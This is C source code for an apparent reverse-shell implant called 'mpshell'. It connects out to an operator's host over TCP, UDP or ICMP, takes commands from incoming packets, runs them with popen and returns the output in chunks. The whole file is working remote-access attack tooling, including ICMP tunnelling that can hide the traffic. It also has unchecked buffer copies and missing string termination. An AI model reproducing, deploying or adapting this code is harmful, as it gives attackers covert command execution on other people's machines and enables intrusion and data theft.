#include "mpshell.h"

extern mp_command_buffer *command_buffer;
extern mp_result_buffer *result_buffer;
extern unsigned char *packet_in;
extern unsigned char *packet_out;

bool RUN                  = true;
char *host                = NULL;
int port                  = -1;
int protocol              = PROTOCOL_TCP;
uint16_t max_payload_size = DEFAULT_MAX_PAYLOAD_SIZE;
useconds_t sleep_size     = DEFAULT_SLEEP;
time_t timeout            = DEFAULT_TIMEOUT;

int main(int argc, const char *argv[])
{
    char delimiter[] = "=";
    for (int i = 1; i < argc; i++)
    {
        char *param_name  = NULL;
        char *param_value = NULL;

        char *current_argument = (char *) argv[i];
        param_name = strtok(current_argument, delimiter);

        if (param_name != NULL)
            param_value = strtok(NULL, delimiter);

        if (param_name != NULL && param_value != NULL)
        {
            if (strcmp(param_name, "--host") == 0)               { host = param_value; }
            else if (strcmp(param_name, "--port") == 0)          { port = atoi(param_value); }
            else if (strcmp(param_name, "--protocol") == 0)
            {
                if (strcmp(param_value, "tcp") == 0)             { protocol = PROTOCOL_TCP; }
                else if (strcmp(param_value, "udp") == 0)        { protocol = PROTOCOL_UDP; }
                else if (strcmp(param_value, "icmp") == 0)       { protocol = PROTOCOL_ICMP; }
                else { show_usage(false); }
            }
            else if (strcmp(param_name, "--payload-size") == 0)  { max_payload_size = (size_t) atoi(param_value); }
            else if (strcmp(param_name, "--sleep") == 0)         { sleep_size       = (useconds_t) (1000 * atoi(param_value)); }
            else if (strcmp(param_name, "--timeout") == 0)       { timeout          = (time_t) (atoi(param_value)); }
            else { show_usage(false); }
        }
        else { show_usage(false); }
    }

    if (host == NULL || strlen(host) == 0)                                                                          { show_usage(false); }
    else if ((protocol != PROTOCOL_ICMP) && (port <= 0 || port > 65535))                                            { show_usage(false); }
    else if ((protocol != PROTOCOL_TCP) && (sleep_size <= 0))                                                       { show_usage(false); }
    else if ((protocol != PROTOCOL_TCP) && (timeout <= 0))                                                          { show_usage(false); }
    else if ((protocol != PROTOCOL_TCP) && (max_payload_size <=0 || max_payload_size > DEFAULT_MAX_PAYLOAD_SIZE))   { show_usage(false); }
    else
    {
        init_buffers();
        int status = EXIT_SUCCESS;
        switch (protocol)
        {
            case PROTOCOL_TCP:  status = open_tcp_channel(host, port); break;
            case PROTOCOL_UDP:  status = open_udp_channel(host, port); break;
            case PROTOCOL_ICMP: status = open_icmp_channel(host);
        }

        cleanup();
        return status;
    }
}

void execute_command(const char *command)
{
    FILE *pfile = popen(command, "r");
    if (pfile == NULL)
    {
        prepare_error_response();
        return;
    }
    else
    {
        char buffer[1024];
        while (fgets(buffer, sizeof(buffer), pfile) != NULL)
        {
            size_t result_size = strlen(buffer);
            if (result_size >= (result_buffer->num_bytes_allocated - result_buffer->num_bytes_occupied))
            {
                size_t new_allocated_size = (2 * result_buffer->num_bytes_allocated);
                result_buffer->data = (unsigned char *)realloc(result_buffer->data, new_allocated_size);
                result_buffer->num_bytes_allocated = new_allocated_size;
            }
            memcpy(&result_buffer->data[result_buffer->num_bytes_occupied], &buffer[0], result_size);
            result_buffer->num_bytes_occupied += result_size;
        }
        if (result_buffer->num_bytes_occupied == 0)
        {
            prepare_ok_response();
        }
        else
        {
            // Add '\0' to the end of response
            result_buffer->data[result_buffer->num_bytes_occupied] = '\0';
            result_buffer->num_bytes_occupied += 1;
        }
    }
    pclose(pfile);
}

void process_packet(
    ssize_t num_bytes_received,
    struct icmphdr *icmp_header_out,
    mp_payload_header *header_in,
    mp_payload_header *header_out,
    unsigned char *data_in,
    unsigned char *data_out
)
{
    if (num_bytes_received < sizeof(mp_payload_header))
        return;

    uint32_t packet_id    = ntohl(header_in->packet_id);
    uint16_t payload_size = ntohs(header_in->payload_size);

    if (header_in->session_id != header_out->session_id)
        return;

    // Received packet need to be an ACK to last sent packet
    if (header_in->packet_id != header_out->packet_id)
        return;

    // Check if there is any data in the packet and save it to the command buffer
    if (payload_size > 0)
    {
        if ((payload_size == 5) &&
            (command_buffer->num_bytes_occupied == 0) &&
            ((strcmp((char *) data_in, "quit") == 0) || (strcmp((char *) data_in, "exit") == 0)))
        {
            RUN = false;
            return;
        }

        memcpy(&command_buffer->data[command_buffer->num_bytes_occupied], &data_in[0], payload_size);
        command_buffer->num_bytes_occupied += payload_size;
    }
    else
    {
        // Execute command if present at first next empty packet
        if (command_buffer->num_bytes_occupied > 0)
        {
            // Copy the command to a new buffer and redirect stderr to stdout
            char command[MAX_COMMAND_SIZE + 5];
            memcpy(command, command_buffer->data, command_buffer->num_bytes_occupied);

            if (strstr(command, "2>") == NULL)
            { strcat(command, " 2>&1"); }

            // Empty out the command buffer
            memset(command_buffer->data, 0, command_buffer->num_bytes_occupied);
            command_buffer->num_bytes_occupied = 0;

            execute_command(command);
        }

        // If there is no command to execute and the result buffer
        // is empty sleep for a period defined at command line
        else
        {
            if (result_buffer->num_bytes_occupied == 0)
                usleep(sleep_size);
        }
    }

    if (icmp_header_out != NULL)
    {
        uint16_t current_sequence_num = ntohs(icmp_header_out->un.echo.sequence);
        if (current_sequence_num >= 65535)
            current_sequence_num = 0;
        else
            current_sequence_num++;

        icmp_header_out->un.echo.sequence = htons(current_sequence_num);
    }

    header_out->packet_id = htonl(packet_id + 1);
    if (result_buffer->num_bytes_occupied > max_payload_size)
    {
        header_out->payload_size = htons(max_payload_size);
        memcpy(data_out, &result_buffer->data[result_buffer->current_read_position], max_payload_size);
        result_buffer->current_read_position += max_payload_size;
        result_buffer->num_bytes_occupied -= max_payload_size;
    }
    else if (result_buffer->num_bytes_occupied > 0)
    {
        header_out->payload_size = htons(result_buffer->num_bytes_occupied);
        memcpy(data_out, &result_buffer->data[result_buffer->current_read_position], result_buffer->num_bytes_occupied);
        result_buffer->current_read_position = 0;
        result_buffer->num_bytes_occupied = 0;
    }
    else
    {
        header_out->payload_size = htons(0);
    }
}
